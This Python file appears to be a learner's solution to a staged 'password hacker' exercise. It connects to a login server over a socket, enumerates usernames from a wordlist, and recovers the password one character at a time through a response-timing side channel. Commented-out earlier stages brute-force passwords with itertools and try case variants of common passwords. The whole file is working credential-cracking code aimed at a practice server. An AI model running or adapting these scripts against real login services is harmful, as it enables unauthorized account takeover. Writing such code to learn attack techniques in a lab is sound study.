import json
import socket
import sys
import string
import time

args = sys.argv
address = (args[1], int(args[2]))
response_buffer = 1024
possible_chars = string.ascii_lowercase + string.ascii_uppercase + string.digits


def send_login(sock, login, password=""):
    login_json = json.dumps({'login': login, 'password': password})
    sock.send(login_json.encode())
    response = sock.recv(response_buffer).decode()
    return json.loads(response)


with socket.socket() as hack_socket:
    hack_socket.connect(address)
    real_login = ""
    real_password = ""
    login_attempt_times = []
    with open("hacking/logins.txt", 'r') as logins_file:
        for common_login in logins_file:
            common_login = common_login.strip()
            # start_clock = time.perf_counter()
            trial_result = send_login(hack_socket, common_login)
            # stop_clock = time.perf_counter()
            # login_attempt_times.append(stop_clock - start_clock)
            if trial_result['result'] == "Wrong password!":
                real_login = common_login
                break
    # max_server_response_time = max(login_attempt_times) * 1.2
    i = 0
    while i < 16:
        for char in possible_chars:
            start_clock = time.perf_counter()
            password_guess_result = send_login(hack_socket, real_login, real_password + char)
            stop_clock = time.perf_counter()
            attempt_time = stop_clock - start_clock
            if password_guess_result['result'] == "Connection success!":
                real_password += char
                login_info = {'login': real_login, 'password': real_password}
                print(json.dumps(login_info))
                sys.exit()
            elif password_guess_result['result'] == "Wrong password!" and attempt_time > 0.0015:
                real_password += char
                # print(real_password)
                break
        i += 1

# Solution to Stage 4
# args = sys.argv
# address = (args[1], int(args[2]))
# response_buffer = 1024
# possible_chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
#
#
# def send_login(sock, login, password=""):
#     login_json = json.dumps({'login': login, 'password': password})
#     sock.send(login_json.encode())
#     response = sock.recv(response_buffer).decode()
#     return json.loads(response)
#
#
# with socket.socket() as hack_socket:
#     hack_socket.connect(address)
#     real_login = ""
#     real_password = ""
#     with open("hacking/logins.txt", 'r') as logins_file:
#         for common_login in logins_file:
#             common_login = common_login.strip()
#             trial_result = send_login(hack_socket, common_login)
#             if trial_result['result'] == "Wrong password!":
#                 real_login = common_login
#                 break
#     i = 0
#     while i < 16:
#         for char in possible_chars:
#             password_guess_result = send_login(hack_socket, real_login, real_password + char)
#             if password_guess_result['result'] == "Connection success!":
#                 real_password += char
#                 login_info = {'login': real_login, 'password': real_password}
#                 print(json.dumps(login_info))
#                 sys.exit()
#             elif password_guess_result['result'] == "Exception happened during login":
#                 real_password += char
#                 break
#         i += 1

# Stage 3 Solution
# # Returns a list of all possible case-sensitive combinations of a password
# def password_permutations(base):
#     results = []
#     for combo in itertools.product(*zip(base.upper(), base.lower())):
#         results.append("".join(combo))
#     return results
#
# with socket.socket() as hack_socket:
#     hack_socket.connect(address)
#     with open("hacking/passwords.txt", 'r') as password_file:
#         for common_password in password_file:
#             common_password = common_password.strip()
#             password_variations = password_permutations(common_password)
#             for password in password_variations:
#                 hack_socket.send(password.encode())
#                 response = hack_socket.recv(response_buffer).decode()
#                 if response == "Connection success!":
#                     print(password)
#                     sys.exit()
#                 elif response == "Too many attempts":
#                     print(response)
#                     sys.exit()

# Stage 2 Solution (inside of socket context manager)
# possible_chars = string.ascii_lowercase + string.digits
# i = 0
#
# with socket.socket() as hack_socket:
#     hack_socket.connect(address)
#     while i < 10:
#         i += 1
#         for guess in itertools.product(possible_chars, repeat=i):
#             password = ''.join(guess)
#             hack_socket.send(password.encode())
#             response = hack_socket.recv(response_buffer).decode()
#             if response == "Connection success!":
#                 print(password)
#                 sys.exit()
#             elif response == "Too many attempts":
#                 print(response)
#                 sys.exit()
